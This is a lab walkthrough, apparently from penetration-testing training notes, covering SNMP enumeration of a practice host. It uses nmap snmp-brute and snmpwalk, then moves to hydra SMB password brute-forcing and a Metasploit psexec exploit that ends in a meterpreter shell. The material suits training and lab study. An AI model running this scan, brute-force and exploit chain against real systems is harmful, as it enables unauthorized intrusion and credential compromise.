# SNMP Analysis

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 3944–3989. Examples are lab-specific and need verification.

In this lab, you will learn to scan the target machine to discover SNMP service and perform information gathering using SNMP nmap scripts and other tools.

In this lab, you will learn to scan the target machine to discover SNMP service and perform information gathering using SNMP nmap scripts and other tools.

**Tools: nmap, msf, snmpwalk , hydra**

```bash

ping -c 5 demo.ine.local
nmap demo.ine.local
                            #
#We must keep in mind that nmap does not check for UDP ports by default. As we already know, SNMP runs on the UDP port 161.
nmap **-sU -p 161** demo.ine.local
#UDP port 161 is open. This information is crucial for our following tasks.
#We could use nmap snmp-brute script to find the community string. The script uses the snmpcommunities.lst list for brute-forcing it is located inside /usr/share/nmap/nselib/data/snmpcommunities.lst directory.

nmap -sU -p 161 --script=snmp-brute demo.ine.local
#community names: public, private, and secret.
 #let's run the snmpwalk tool to find all the information via SNMP.
 #snmpwalk: snmpwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information. An object identifier (OID) may be given on the command line
snmpwalk -v 1 -c public demo.ine.local  //-c community string -v version
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
ls
nano users.txt      administrator, admin
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
#run the psexec Metasploit exploit module to gain the meterpreter session using these credentials.
#PSExec (Microsoft Windows Authenticated User Code Execution): This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals.

msfconsole -q
use exploit/windows/smb/psexec
show options
set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit
meterpreter>
shell
cd C:\
dir
type FLAG1.txt
```

We have successfully exploited the target machine by extracting information via the SNMP service.
